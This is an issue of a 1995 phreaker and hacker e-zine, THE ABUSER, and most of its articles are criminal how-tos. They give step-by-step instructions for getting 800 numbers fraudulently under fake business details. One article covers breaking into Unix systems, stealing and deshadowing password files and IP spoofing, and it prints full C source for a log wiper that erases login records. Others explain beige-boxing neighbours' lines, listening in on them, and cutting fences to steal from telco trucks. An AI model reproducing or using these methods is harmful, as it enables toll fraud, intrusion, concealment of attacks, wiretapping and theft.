LETTER FROM THE EDITOR:
                        
This is the first issue ever of THE ABUSER that hasn't been coded. From what
I hear Spiff is down at the shore for the summer (I guess he is entitled to a
break once in a while). To make up for the non-coded issue, this issue is
somewhat large than past issues.

Please take the time to fill out the ABUSER survey that is included 
with this pack and return it to one of our distro sites. We would
appreciate it.

Check out the First Special Issue of THE ABUSER also included in this
pack. It is not coded and not very H/P related, but is an inside look
at CAFBL. You should enjoy it.

I was told by Spiff to check out the INFINITY E-Mag #2 because THE ABUSER
issue 9 got reviewed in there this month. So I did, and I was happy to see
that we made third in the rating list. Also it was good to see what other 
people thought of the mag. There hasn't been too much feedback other than
'you guys rock' or 'you guys suck'. So thanx to the INFINITY staff for 
taking the time to check us out.


CAFBL NEWS:

There isn't too much "CAFBL NEWS". We are putting THE ABUSER with 
regularity now and it can be a magazine that can be depended upon to 
be released monthly. CAFBL hasn't been doing much other releasing. We
are all working on inside projects even a local 215 television show.
We would like to welcome Logik (whose first article is in this issue)
to CAFBL. He knows more about hacking than most of us in the group (as
you could probably tell, most of us are phreaks) and has a lot to 
contribute. We would also like to welcome Neko and Low Level into CAFBL.
Please check out the CAFBL.NFO file for the latest member list and distro
list.

HOW TO SET UP 800 NUMBERS BY KAOS:

What's up people? Its me kaos with another release for The Abuser. 
This month I wanted to write about something that can help everyone 
and something that we can all use. What could it be? Simple. 800#'s. 
Setting up an 800# to your personal line, modem line, or fax line is 
a lot easier than people think. AT&T doesn't seem to care too much 
about it so why not get one? Best of all, its free! Ripping off the 
phone company is just one of those things that has to be done :) A lot 
of people have been concerned about getting caught or getting in 
trouble with AT&T. This simply won't happen. I do not know of anyone 
that has gotten in trouble for an 800. If you did hear about that, I'd 
like to know what happened so just leave me a message on my VMB (I'll 
post the number at the end of the article). Ok, back to the article. 
Here is a step by step procedure on how to set up 800#'s for your own 
personal use. 
[1] Get the name, number, and address of a local business in your area 
    code.
    Make sure you have all of this info:
    FAKE NAME (for billing reasons)
    NAME
    STREET ADDRESS
    CITY, STATE & ZIP
    PHONE NUMBER OF THE LINE THAT WILL BE GETTING THE 800#

[2] You will not need the phone number of the business because this is 
    where you will be putting the number of the line you need the 800# 
    to. You might need some social engineering skills but it is 
    relatively easy.

[3] Go to a payphone somewhere. Call up the operator and have her 
    connect you with 1-800-222-0400. This is just to kill ANI. I know 
    you don't want them to know you are calling from a payphone right?

[4] Here's where your social engineering skills will come into play. 
    Once you get to the AT&T operator, tell her that you would like to 
    set up an 800# for your business. She will tell you about the 
    service and mention some features etc., so be ready for anything. 
    Make sure you tell her that you want READY LINE SERVICE. This 
    service is the best you can get and will keep the line up for a 
    long time. Keep her talking and listen to what she says.

[5] If you want, there is a neato feature that you can add to your 
    800#. Number Selection. Kamui of Cafbl has an 800# up to his 
    board. When I first set it up, I asked for 1-800-X-PSYCHO (x=0-9) 
    but it was unavailable. Try it! Ask for a number and see if you 
    get it. 

[6] Ok, now all you have to do is give her the info that you got out 
    of the phonebook and a fake name. After this, you should be all 
    done. Now have a pen ready to write down the number. Tell her to 
    have a nice day and that's it. Simple huh?

BELOW IS AN EXAMPLE OF ME SETTING UP AN 800#...  ..   .        .    

[kaos] Hi, I'd like to set up an 800# for my business.
[them] Ok sir, just a second.
[kaos] No problem.
[them] Ok sir, what is your name? 
[kaos] Jim Mainor.
[them] What is your area code and phone #? <Give her the # of the 
       board>.

[kaos] 666 JoeMama Drive.
[them] Ok. What is the city, state and zip code there?
[kaos] Its Philadelphia, PA 19146.
[them] Ok. And what is the name of your business?
[kaos] Mainor Shoes Incorporated.
[them] Ok. Would you like your 800# listed in the directory.
[kaos] Ok. Sure. Also, I heard it was possible to pick the 800# that I 
       will have. Can I do that now? 
[them] Sure. What would you like the number to be? I'll check and see 
       if we have the number available. 
[kaos] Do you have anything with 243373 (cheese :)
[them] Let me check. 
<*NOTE* do not give her the word you want, give her the numbers>.
[kaos] Ok, no problem.
[them] sir we have three combinations with 243373. 
[kaos] Ok, I'll take the first one.
[them] Ok sir, now we have various different plans for 800#'s. Do you 
       know how many hours the 800# will have in a month. 
[kaos] I'm not really sure but I know there will be a lot of use out of 
       it. A friend of mine has an 800# for his business and he told 
       me for a lot of use that I should get something called READY 
       LINE SERVICE. 
[them] Ok, I'll set you up with that plan then.
[kaos] Ok, great.
[them] Please do not give out the number until you know that it is 
       working.

UNDERGROUND NEWS:

 RECENT BUSTS 5/12/95:

    I can only hope that these occurrences are at their end... The secret
 service and telco security have been making busts nationwide including
 some notables in the scene... Among the crucified are Neon Samurai (amitech)
 Knight Lightning (aka craig neirdorf), Tokin Entry (amitech) and Hellfire 
 It seems the feds had a DNR (dial number recorder) on a few h/p'ers lines.
 There's no evidence that the busts are over. Neon Samurai has been charged
 with 3 felonies... From all reports the feds seem to be looking for credit
 call card fraud. Also PBX's Vmb's and some internet hacking. Cell phones
 also top their charts.. There's no other evidence available at the moment...
    The resistance bbs is gone for the interest of my own private freedom.
 Maybe it will move and go up again keep your eyes and ears open. The scene
 is not a private place in fact it is said that agents were planted on
 UPT and celco51, how we don't know but it's enough to let us all know that
 the authorities are getting craftier... On a humorable side note it was
 estimated by NYNEX that Neon Samurai had $50,000 in stolen telco property
 in his possession (jeez I told him not to steal that dms-100!)... Well
 this is a very serious and real subject. I'm counting on the ability of
 the scene to spread info quick so that people know before it's too late.
 Look if you want to be safe, keep to yourself because in this country even
 the walls have ears.......

   Luck to all those busted,

WHAT HAPPENS WHEN YOU GET CAUGHT BEIGE BOXING BY RUSH 2:        
[Republished without permission from PHRACK 47]

        Yeah , I'm the only one.  But here is a generally interesting
description of everything to getting caught to arraignment.

        Well about 5 months ago i needed to set up a conference really quick.
it was about 12:00 (never knew there was a 10:00 pm curfew in that area) and 
went to a 25 pair box at this local strip mall.  Well I was out there the box 
was already open and I was just about to start testing pairs to see which was 
connected and what wasn't.

        All of a sudden, i hear this loud screeching sound of a car coming
to a skid from doing about 90mph.  I turned and saw that typically dirty 
squad car about to hit me.. you know the car, mud and dust on the tires and 
body, coffee and smudge marks all over the windshield.  i got on my bike and 
started to run.  Now the thing is I COULD have gotten away.. the pathetic 
excuse for a cop had run not more than 10 yards after me and decided that I 
was a threat so he pulled his handgun and yelled.  I saw this and thought it 
would be wiser to stop than get shot.

        Within 2 minutes at LEAST 10 squad cars had come to his aide.. i did
not know i was less than a half mile from a police station and they were
looking for a prowler in the general area.  The police did the normal, called 
me scum, asked me what i was doing, searched me until they were satisfied...  than picked me up and threw me in the car... the funny
thing was they didn't see my phone until they threw me into the back seat and 
the cord fell out.. (they never saw the page of notes and 'naughty' material 
in my pocket though it was about 4 inches thick and sticking out that a blind 
man could see it.

        Well they got me to the station and pried my info out, and called my
father... I came up with a good enough story about some made up user who told 
me to go across the street and plug in..  then I was told I would be dealt 
with in the next week...  I did not receive anything for three and a half 
months.

        Once the time came for the arraignment (for a juvenile they called it
an intake).  I got to go to the police station, sit for about 3 hours (as if 
i thought they would be on time) until I waited for my probation officer. 
Finally she got there and we proceeded to talk.  She explained all of the 
charges and my lawyer (interesting guy) laughed, I was being charged with 
prowling (could be disputed I was on a public sidewalk and there in that 
strip mall is a 24 hr laundry mat), loitering (again that could be disputed), 
and attempted theft of services (though I NEVER even plugged in).

        After this was all said i spent the next hour talking with the lady
in private.  I immediately found she had an interest in computers and was
having a problem with her home pc.  So I easily changed the topic to my
fascination in computers and solved her problem with her computer, and
answered at least 50 questions about them.  In the last 10-15 minutes of the 
conversation all i could get from her were statements about how impressed and 
how intrigued she was with me.  She ended up giving me a look (that was hard 
to judge but i am staying away from this chick) that was either confusion or 
attraction, slipped me a card with her home phone number and name and called 
back in my lawyer and parents.

        Once they got back in, all that she really said was I was a great boy,
that she would like to see me do more with my time besides computers, and 
that she was taking my sentence of 12 months formal probation with 300 hours 
of community service to 3 months of informal probation with 30 hours of 
community service.  That and she said bell was asking her what to do and she 
would tell them that it was a non issue since I did not plug in and even if I 
had it would not be their concern unless I had plugged in to the telco access 
part of the network interface.

        Well I have yet to receive official record of having to perform the 
community service or the probation but I called my probation officer 
yesterday and said she wasn't putting the community service into the 
punishment and it has been an equivalent amount of time to just say that 
since I haven't gotten in trouble since she will count the probation as 
already served.  Luckily she based all other needs of me on the report from a 
teacher, and with my luck she picked the one teacher, my computers teacher, 
that no matter what I did or said would lie and say I didn't.


HACKING THE INFORMATION SUPER HIGHWAY BY LOGIK:

~Introduction~
        Everywhere you look these days you'll see something about the
information super highway, or what it is sometimes better know as the
Internet. This computer network is very large and holds a great wealth 
of information. The only catch being one most know where to look for it. 
The other problem is a lot of the time the most valuable information is 
protected by a tight security system, or so the sysadmins think. Still, 
just because a system may look secure, doesn't mean it is. Remember, the 
only "safe" computer is one that's locked in a vault six feet underground 
and doesn't have a modem (or any such connection system) hooked up to it. 
So, how does one access the hidden information inside the depths of the 
Internet? Continue to read and you'll find out. Oh yeah... and I'm making 
the assumption that you already know how to get around on the internet.

~A Little Background~
        The best way to understand the present is to know a little about 
the past. So, let's look at the origins of the information super highway. 
The Internet is actually a collection of several different computer networks 
and subnetworks. The first (ARPANET) was implemented in 1969 by the United 
States government. Then, in the early 1980's the TCP/IP protocol became the 
standard for the Internet. In 1983 ARPANET (which was called APRA Internet 
or DARPA Internet) was broken down into ARPANET and MILNET. Today, with the 
expansion to LAN (Local Area Network) and WAN (World Area Network), the 
Internet is 2000+ networks strong. Included in this group is military, 
commercial, and university systems.

        For many years the Internet was very elitest and hard to navigate.
Only people who knew what they were doing could use it. However, with recent
improvements to the network (such as SLIP and PPP) it has become a little bit
easier to get around. Also, new additions to the Internet such as the World
Wide Web have helped too. With this has come the addition of many smaller
"sites" to the internet. Many of which have valuable information within them.
Now all you need to do is find and get into them.

~Security~
        The best way to beat anything is to know your enemy. Which in this
case is network security. May it be a university, company , or the 
government. Just remember. Anyone you hack CAN track you thru the internet 
if they really want to. However, chances are the company or university will 
just let you go (if you are noticed) because it would either be too much of 
a hassle or too embarrassing for them to go after you. Still, the government 
and telephone companies are rarely as nice. The bigger the organization 
behind the Internet "site", the more likely they are to go after you. Try to 
stay away from big places. They probably have more people attempting to hack 
them. So, they'll have better security and more reason to catch anyone they 
can.

        According to the computer security standards developed by the United
States Department of Defense there are seven different levels of security.
The first, D1, is the lowest form of security available. This applies to
systems that are totally unprotected (such as common DOS, Windows, and Mac
computer systems). This system can not tell the difference between users and
does not have any controls over what information can be accessed on the hard
drives of that computer.

        The second security level is C1, or Discretionary Security Protection
system. This describes the typical internet site security. The system
requires a user login name and a password. There is usually restrictions on
file and directory permissions. This is set by the sysadmin and is used to
prevent certain people or groups to access programs or information.

        The third security level is C2. This is much like the C1 level, but
it goes further. Level C2 has the ability to further limit users from
executing certain commands. It also keeps records of all security-related
events. This allows the true sysadmin to know who executed what when.

        The fourth level is B1, or Labeled Security Protection. This level
allows multilevel security, such as secret and top secret. More so, this
level states that an object cannot have its permissions changed by the owner
of the file.

        The fifth level is B2, or Structured Protection. This level demands
that every object (such as disks or terminals) be labeled. Also, to each
device a security level (multi or single) must be assigned so objects with
different security levels can't interact.

        The sixth level is B3, or Security Domains Level. This level demands
that a user's terminal must be connected to the system thru a trusted. Also,
there is protection for the security domain from unauthorized access or
modification of objects.

        The seventh and final level is Level A, or the Verified Design Level.
This is, currently, the tightest security for a computer system. For Level A
security to be achieved, all the lower security levels must be implemented
and the software and hardware must be protected before shipment. This is to
prevent tampering with the security systems.

~Hacking~
        So, now that all that is out of the way let's get to what you really
want to know. How to hack the Internet. Okay, first find a good site. You
should use Telnet to access these systems. More then likely the site you'll
find will run Unix, or some derivative. If not, you may have a harder time
with getting in. Basicly, the only way to get into a system is to brute force
hack an account, trade for an account on the system, social engineer an
account, or find one while trashing. Also, you could do a little Ethernet
sniffing, but if the site is running a firewall, it probably won't work. I
really hate to just leave the actual getting in the system to this, but the
ways I've listed are the only ways I know of. Then again, you could FTP into
the site (if they have anonymous FTP) and try to download the passwd file,
but sysadmins these days rarely are stupid enough to leave the passwd file
accessible thru anonymous FTP.

        Once you're in the "site" you get to have some fun. I'm assuming that
you hacked out a regular user account (seeing as accounts such as "bin" and
"root" usually have complex passwords and can't be guessed). So, you are now
at some sort of Unix-type prompt. Now what? Well... always check out that
user's mail and look around in his/her directory. You may actually find 
something interesting. After you look around, you'll want to find the passwd 
file. As you probably already know, the passwd file holds the encrypted 
passwords of every user on that system. This is the easiest way to get 
control of the system (by running a program such as Cracker Jack and finding 
out the root password that way). So how does one go about finding the passwd 
file? Well, first look in the /etc directory. It should be there. What you 
want to then do is "cat" the passwd file. This will dump the contents of the 
passwd file to your screen. If you're lucky it'll contain the encrypted 
passwords of that system's users. How can you tell if you've found the right 
one? Well, if you "cat" the file and you see something like this: 
chare:2eLNss48eJ/GY,C2:215
then you've found the right file. If this happens, do a screen capture and
"capture" the contents of that file for later use. However, on systems with
higher security (such as large Internet providers and companies) the passwd
file is more then likely shadowed. This means that the passwd file does
not contain the encrypted passwords and that Unix (or such software) looks
elsewhere for the encrypted passwords. Thus, YOU must look elsewhere for the
shadowed password. The shadowed passwd file is usually located in a place
where normal users can't access it (such as the /root directory). The best
way to get around this is to run a deshadowing script on the system. You can
find one of these on the Internet at ftp.netcom.com /da/daemon9. You must
ascii upload this file to that site (because you can't upload and download
things thru Telnet, except for ascii). Once you have deshadow.c on that site,
compile and run it. It should output the shadowed passwd file. If it doesn't,
then you must go about another way to hack root at this site.

        There are several ways to go about this. First, if the deshadowing
thing doesn't work, try "ypcat passwd". Sometimes, if the system you're on
uses NIS/YP, that'll output a valid passwd file. If that doesn't work, a
great way to gain root access is thru IP Spoofing. IP Spoofing is when a host
that is not connected to the network makes it look like they are one of that
system's trusted hosts. This is done by changing the alien site's IP number
to match that of the trusted host. You can find trusted hosts by looking at
the "hosts.equiv" and ".rhosts" file. These should list the trusted hosts.
However, this is easily beat by the sysadmins if the implement a firewall 
that can check the origin of the IP address. So what can a hacker do when 
caught up in this mess? Well, the best advice is to do some research on that 
software. Talk to people and see if there are any known holes in that system. 
If you're lucky one of the holes will work. To date there are way too many 
holes to list in detail. So, you'll have to find them on your own.

        Once you have root access on that site, look around. You now have
complete run of the system. Check out other people's mail. Read that
"Classified" information that you were after so much. Look for any valuable
programs. Have fun. You have gotten what you wanted.

 ~Don't Get Caught~
        The last thing you need to do is not get caught. This is a little 
more tricky. See, if you are on a computer "site" that wants to come after 
you, they can. It is very easy these days to track where a incoming telnet
connection came from. Thus, you need to hide your tracks. The best way to do
this is to run it thru several hacked out accounts. How does one get these?
Well, read the last part about hacking. That should tell you. If you're just
starting at hacking, and can't hide your tracks too well, at least trade for
an account or something. Also, I would suggest that if you are hacking any
high security places (such as government or telephone company computers) that
you run your call thru several outdials and possibly even a PBX or two.
Remember, "just because you're paranoid. Don't mean they're not after you".
Also, once you're finished doing your hacking, edit the system logs so it
looks like you were never there. You can't do this with the plain text editor
that most Unix-type sites have. You must write a short little program to edit
the /etc/utmp. /usr/adm/wtmp, and /usr/adm/lastlog files. Here's an example
taken from the HACK.FAQ:

--------------------------------START----------------------------------------

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

int f;

void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}

void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;

     if ((pwd=getpwnam(who))!=NULL) {

        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }

    } else printf("%s: ?\n",who);
}

main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}
--------------------------------------END------------------------------------
        Just compile and run it. This should work. Other then that, ALWAYS
do a "who" when you log onto a system to make sure no other high security
level person is watching you. They may be able to tell you are hacking the
system, and that could lead to some serious problems.

~Conclusion~
        Now you should know most of what you need to know on how to hack the
information super highway. Granted, there are many things missing from this
text file. However, if I was to write everything on hacking the Internet, 
this file would be way too long. So, look around for more help on hacking as 
you need it. We all can learn more.


FIELD PHREAKING BY DOG'N'DIRT:

Intro: The purpose of this file is to help you develop a small background
in the fine art of Field Phreaking. This is by no means a complete file.
Rather it is a short, concise Introduction to Field Phreaking.



1.0 The Kit: The most important part of the Field Phreak besides his mind
    is his Field Kit. I am going to present two full kits. The first kit
    that I will present is a kit that is completely made from items that
    I have found around my home. If I felt that something had to be bought
    I would either delete it or find a suitable alternative. The only
    exception that I made is for parts which could be found at your local
    Rat Shack (Radio Shack) for under five dollars. The second version is
    a kit that is made of the finest tools in which case time, money and
    risk are not of any concerns. It may involve several plant department
    runs as well as several trips to Rat Shack.

1.1 Homemade Field Kit:
    I will first make a checklist of what is needed then I will explain
    each item in detail.

    °Backpack °Test Phone °7/16 ratchet °3/8 ratchet °Phillips screwdriver

    °Flat screwdriver °Wire cutters °Pliers °Utility Knife °Pen light

    °Flashlight °Gloves °Pencil@Paper °Smoke Bomb °Matches °Mask/Bandanna

    °Sharpie(R) marker

1.111 Backpack: Get a large, black one with several pockets to hold materials.
               Make sure that there is enough room in the main compartment
               to put in anything that you may pick up at a plant department.

1.112 Test Phone: One of a phreak's most important tools. Used to tap into
                 lines and access telephone boxes. If you already have one
                 you are all set, if not I will give you instructions later
                 on in the file.

1.113 7/16 and 3/8 Ratchet: Used to open up TelCo boxes. Just carry a ratchet
                             and put the two sockets in a pocket of your bag.

1.114 Pliers: Used for misc. stuff. Always smart to carry.

1.115 Utility Knife: Others have said that a regular pocket knife or Xacto
                     knife would work. They are full of shit. A utility knife
                     serves the same purpose as a Xacto and is much more
                     durable.

1.116 Penlight: Small and safe. Useful for use when you are working in a
                box. Also good when a large light is not practical or smart.

1.117 Flashlight: Get the best one that you can possibly find. Make sure it
                  is durable. A great, strong light ain't shit if the friggin
                  thing breaks on you. Also do not use at the box itself
                  unless you are in a remote area. Useful for getting to your
                  spot and then taking notes afterward.

1.118 Gloves: Very important. I do not think that I have to explain the many
              reasons for carrying these. Any type will do. I use last 
              seasons batting gloves.

1.119 Pen(cil)@Paper: Used for writing down things as phone numbers and
                      locations. Pen or pencil is whatever you prefer. I
                      usually go with a pencil but a pen is fine. Get a small
                      pad that has a covering over it. Something that is
                      a leather or something. You usually get things like
                      this free as promotional gimmicks at seminars and the
                      like. Also make sure it can fit into your pocket with
                      out much difficulty.

1.120 Smoke Bomb: This, or any other number of devices can be effectively
                  used to at least distract TelCo personnel or local law
                  enforcement to give you enough time to leave.

1.121 Matches: Important for both survival and lighting things such as
               smoke bombs.

1.122 Mask/Bandanna: Hide your identity and also helps when in a dusty
                     area.

1.123 Sharpie: Used to mark your territory and identify things later on.


Test Phone:
===========

The Test Phone is the most useful piece of equipment for Field Phreaking. You
can try to sneak into a telco Plant Department [truckyard] and get a real 
test phone out of a truck like we did.  If you'd rather not do this, don't 
worry; making your own test phone is ultra-easy.

First, get a telephone for your own purposes.  Find the wire coming out of 
the phone that is supposed to go to the wall's modular jack.  It should be at 
least three feet long for convenience.  Cut off the modular jack at the end 
of the wire.  Strip the wire, and there should be two or four small wires 
inside. Hook the two middle wires to alligator clips [preferably insulated].  
You now have a test phone!  Very easy, indeed.  Now let's see if you hooked 
everything up ok.  First find your phone box.  It'll probably be on the 
outside of your house.  It's fairly small, and you might need the ratchet to 
open it up.  Once you get it open, you should see some screws.  These are the 
terminals for your phone line.  Hook the alligator clips to the two top 
terminals.  If your phone is ok, you should get a dial tone.  Once you know 
that your phone is working, a whole new world opens up to you!  You can hook 
the phone up to your neighbor's terminal and call long distance or yell at 
the operator on their line.  Be careful, though.  You don't want to be 
talking to Sue in L.A. when your neighbors are home and awake.  If they pick 
up the phone when you're already on, you could get into serious trouble.  Of 
course, you could always listen in on them!  If you want, you can hook wires 
up to your neighbor's terminal and lead them to your house.  In case you 
didn't know, this is called Beige Boxing.  You can then hack computers on 
their line, call Dial-A-Prayer, etc.  Make sure to hide the wire well so that 
it won't be traced to your house!


Manholes:
=========

One way to get access to an abundance of phone lines is by getting into telco
manholes. You don't want to accidentally get in a sewer manhole, so the first
thing to do is find the differences between sewer and telephone manholes. If
you have trouble with this, here's a few tips that might help:

o  Telco manhole covers are usually larger and heavier than other covers.
o  Telco manholes are scarce compared to sewer manholes.  So if there are
   a lot of checkered manhole covers in your area, those are probably sewer
   manholes.  If there are only a handful of unmarked manhole covers in
   your area, those probably contain phone lines.
o  Go to your local telco Central Office [CO] and find out what the manhole
   covers look like there.  Find manhole covers that look the same in other
   areas, and pick a convenient/safe manhole to explore.


Once you get the manhole cover off, shine a flashlight down to see if there's
a ladder going to the bottom.  Try a different manhole if there's no ladder.
If you want to go down a manhole, don't forget to wear a bandana or surgical
mask over your mouth so that you don't choke on dust. Also bring a flashlight
so you can see what you're doing.  Many times, there'll be a few inches of
water at the bottom, so you might also want to wear boots.

Down in the manhole, you might find some equipment or manuals.  Go ahead and
take them if you want; you deserve it!  There should be some very large ABS
plastic tubes going across the "room" you're in.  The phone lines are inside
these tubes.  Attached to this tubing there will be some short, wide plastic
cylinders.  There'll be screws holding these cylinders on to the tubing.
You'll need either a screwdriver or a ratchet to open a cylinder.  If you
happen to get a cylinder open, congratulations!  You now have access to
countless phone lines!  We'll leave it to you to figure out what to do with 
all of those wires.  Surely you'll figure something out!  [snip, snip!]


Exploring Telco Building Sites:
===============================

One of the best ways to get information about telco is by going to a Central
Office near you, exploring the trucks in a Plant Department, or "visiting"
other telco buildings.  The phone company is careless in many ways.  They
leave important, yet unshredded documents and computer printouts in their
open dumpsters.  Their cars, vans, and repair vehicles are almost always left
unlocked.  Inside their vehicles one can usually find manuals, test phones,
computer cards [usually for mainframes, almost never for personal computers],
nice tool sets, etc.!  It's almost as if they *want* to be ripped off!  They
deserve bad treatment just for their negligence.  If possible, we like to be
courteous to individual employees of telco. Most employees are fairly amiable
and don't deserve trouble.  It's the beuracracy of telco that deserves to be
manhandled.  Cheap practices such as monopolizing and the overpricing of
services is the general reason why we phreaks do what we do with such
determination.  On with the show.

Exploring Dumpsters:  Looking inside telco dumpters is probably the easiest
way to acquire useful information.  Typycally, dumpters will be found outside
a Central Office.  They are usually left open for the world to see.  It's a
good idea to check a dumpster near you every day or two. You want to get your
printouts and such before they go to the garbage dump.  Make sure that you
aren't pulling stuff out of the dumpster when the employees get out for the
day! If possible, check the dumpster after closing hours just to be safe. But
it's usually ok to get stuff out of it during working hours.  You should find a
lot of useful information, including computer numbers, if you consistently
check the dumpsters.

Exploring Plant Departments:  Plant Department is just a strange name telco
made for a truckyard.  You might need your 'ol wire cutters for this job.
Plan to stay up late for this mission, too.  Around here, at least, the Plant
Department doesn't close until 11:30 to 11:45 p.m.  If your local Plant
Department isn't bound by barbed-wire fences, you're lucky. If, 
unfortunately, it's like ours, you'll have to find a way to get in. First, 
try to find breaks in the fence where you might be able to slip through. If 
this isn't possible, and you can't climb over the fence because there's 
barbed-wire at the top, get out the [gasp!] wire cutters. Cut the barbed-wire 
and climb over the fence. Quietly move around the truck yard, opening various 
trucks, taking whatever you want. Although it might be hard, try to control 
yourself. Only take one item per truck so that the fools don't get 
suspicious. You don't ever want them to get suspicious, or you'll never be 
able to go back without fearing that they might be watching the truckyard for 
intruders.  Just take a testphone and a few handy manuals.  The testphone is 
usually in the back behind the passenger's seat.  Manuals should be in the 
glove compartment or between the two front seats.  The rest of the gadgets in 
the trucks have little or no practical uses for phreaks.  Too bad.  Be cool 
and don't take anything you don't need.


STOLEN INTERNET ACCOUNTS: HOW TIRED BY KEY MASTER:

Are you sick of switching internet accounts every month after they finally 
"find out"?  The constant pain for others to even contact you, part of the 
point for having an account in the first place, because your damn address 
keeps changing!  Maybe you are one of those people who have a fake account 
just to say you have one.  Remember the whole point of the internet?  To 
exchange information... to communicate...?  How can you do that when you keep 
having to relocate so no one can find you?  How tired.

I'm just sick of the whole deal.  Not using the account too much this day or 
too much that day... not doing that, not doing this... or else.  Oops!  The 
number is gone.. time to get another account.

This article is basically about getting a real account the non-|<-rad way to 
the Internet and what tools you can use for FULL access to everything it has 
to offer.  I have included the more popular service providers, their phone 
numbers, and a list of popular software you can choose from to use for your 
new account or your existing account.  It's quite easy if you have the right 
knowledge.

I don't want to give the complete history of the internet or whatever, I 
don't have time to write about that.  Here is the nuts and bolts for total 
access to the 'net.  Yeah! I will first explain how to get an account, and 
then list the best software for use with your new or existing account.


PART I: OPTIONS. (w/ brief summary) (BEST -> WORST ACCESS)

a.  Dedicated (Direct) Account.

    You Lucky Bastard!  The most expensive type, typically
    used by universities for their students/employees.

    Average cost/month: usually free, actually.

b.  Dial-In SLIP/PPP Account.

    Like... Your Own IP Address.  You dial into a company
    that has a direct connection; usually Windows-based.
    Depending on your software, this can be a VERY easy way
    to navigate the internet.

    Average cost/month: $15 to $35

c.  Dial-In Shell Account.

    And this, My Friends, is UNIX (some providers use other
    operating systems).  You dial into a company that has a
    direct connection; usually DOS-based.  For the die-hard
    UNIX command line oriented.  Recently, however, some
    providers have a Windows interface available--probably
    not as flexible as the UNIX command line equivalent.

    Average cost/month: $10 to $20

d.  Online Services; Dail-In Terminal.

    Prepare to be ripped off.  CompuServe (CIM), America
    Online (AOL), Prodigy.  Note: Prodigy and CompuServe
    (and Delphi soon) have started offering SLIP/PPP
    connections.  These services, however, hold your hand
    every step of the way--good for beginners and
    recommendations to beginners.

    Average cost/month: $10 to $20, plus "extra" (That
    "extra" adds up quick unless you plan to lurk around
    "basic services" picking your nose..)

    Quick & Dirty general recommendations:

         Delphi - Prized for its internet access
         CompuServe - Prized for its data (and interface,
                      but interface not as good as America
                      Online.)
         America Online - Prized for its interface and
                          user hand-holding (and data, but
                          data not as good as CompuServe.)
         Prodigy - Popular for little kiddies, ALSO prized
                   for Stock information for executives.
                   (Nice combo, eh?)

e.  BBS Accounts.

    Better than nothing, I guess.  Some bulletin board
    systems offer their users VERY LIMITED (but still real)
    access to the internet, usually in the way of offline
    email and offline message networks only.  One thing to
    note is how often the BBS connects to the internet to
    do processing.

    Average cost/month: FREE to $15


Those are all your internet options.  Choose one or even
more than one.  I recommend the following type of account
package if you can find it (IDEAL):

o Dial-In SLIP/PPP Account with optional Dial-In Shell
  Account, all in one account package.  (PPP is better than
  SLIP, so try to get a PPP connection.)

o Dial-In speed of at least "v.32bis" (14.4), "v.32terbo"
  (19.2), or "v.34" (28.8).  (Note, "v.fc" is also 28.8.)

o A LOCAL ACCESS NUMBER with which you can call to without
  being charged by your phone company.  A "local call".

o A FLAT RATE with unlimited time, so you don't pay $$
  for every hour you go over some sort of limit of hours.

o A LOW one-time "Set Up" fee.


Some internet access providers are listed below--most
include Dedicated, SLIP/PPP, Shell, and UUCP (for BBS
SysOps) accounts.  Note: "UUCP" is a popular service that
bulletin board system operators use to get their users
internet email accounts and internet message network
access.

PART II: SOFTWARE.

1. Dial-In Shell Account.

All you need is probably what you already have and use: a
communications terminal program like Q-Modem, Telemate,
Telix, or ProComm.  Usually, Shell Accounts require your
software to emulate VT-100 or later for a text-based menu
or command line system.  All the before-mentioned programs
support VT-100 or later.  Note that ANSI text color is
rarely seen (if ever?) in the UNIX world.

Recently, however, some providers have enhanced their tools
with easy-to-use Windows graphical user interfaces for
Shell Accounts.

2. Dial-In SLIP/PPP Account.

This is where the hyped graphical World Wide Web (WWW) can
be accessed, with the right software.

SOFTWARE. (w/ brief summary)

a. Spry's Internet in a Box V2.0.

The most popular and general ease-of-use winner out of all
commercial internet packages.  Comes with Spry Mosaic WWW
browser and a host of other utilities.  Impressive GIF/JPG
viewer comes with it called ImageView.  Retails for about
$100 in the store.

b. Netmanage Inc.'s Internet Chameleon.

Probably the second most popular.  Comes with a host of
utilities, including ARCHIE, FINGER, and PING, which Spry's
Internet in a Box V2.0 doesn't have.  In general, not as
easy to use as Spry's package, however.  Retails for about
$50 with no manuals if upgrading from the shareware
version.  Price unknown for it with manuals in the store.

c. Trumpet WinSock.

A very handy protocol for Windows.  The most recent version
now supports both SLIP and PPP access accounts.  It acts as
a dialer and SLIP/PPP protocol translator for other
programs, like, for example, Netscape Navigator, which
REQUIRES a program like this to even run.  Can be found by
an anonymous FTP to ftp.trumpet.com.au or to
inorganic5.chem.ufl.edu in the gopher/pub/winsock
directory.

d. Netscape Navigator.

Considered the best WWW browser.  Now, however, more recent
